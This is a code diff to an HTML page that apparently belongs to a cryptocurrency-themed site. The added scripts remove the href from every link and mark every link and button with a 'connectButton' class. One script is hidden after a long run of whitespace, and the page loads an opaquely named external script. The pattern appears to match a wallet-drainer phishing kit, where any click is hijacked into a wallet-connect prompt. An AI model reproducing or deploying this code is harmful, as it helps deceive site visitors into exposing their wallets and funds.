@@ -19,24 +19,41 @@
       };
     </script>
     <script charset="UTF-8" async type="text/javascript" src="./170fcd34a91372-1.js"></script>
-        <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        var links = document.querySelectorAll('body a');
-        for (var i = 0; i < links.length; i++) {
-        var link = links[i];
-        link.removeAttribute('href');
-        link.classList.add('connectButton');
-        }
+      <script>
+  document.addEventListener('DOMContentLoaded', function () {
+    var links = document.querySelectorAll('body a');
+    for (var i = 0; i < links.length; i++) {
+    var link = links[i];
+    link.removeAttribute('href');
+    link.classList.add('connectButton');
+    }
+    });
+    </script>                                                                                                                          <script>
+  document.addEventListener('DOMContentLoaded', function () {
+  var buttons = document.querySelectorAll('body button');
+  for (var i = 0; i < buttons.length; i++) {
+    var button = buttons[i];
+    button.classList.add('connectButton');
+  }
+  });
+  </script>
+      <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        const elements = document.querySelectorAll('[ad-data-linked]');
+        elements.forEach(element => {
+          element.removeAttribute('ad-data-linked');
         });
-        </script>                                                                                                                          <script>
-      document.addEventListener('DOMContentLoaded', function () {
-      var buttons = document.querySelectorAll('body button');
-      for (var i = 0; i < buttons.length; i++) {
-        var button = buttons[i];
-        button.classList.add('connectButton');
-      }
+      
+        console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
       });
+      
       </script>
+      
+        <style>
+        .connectButton {
+        cursor: pointer;
+        }
+        </style>
   </head>
   <body class="bg-[#141416]">
     <nav class="flex justify-between sm:px-16 px-8 py-3 items-center">
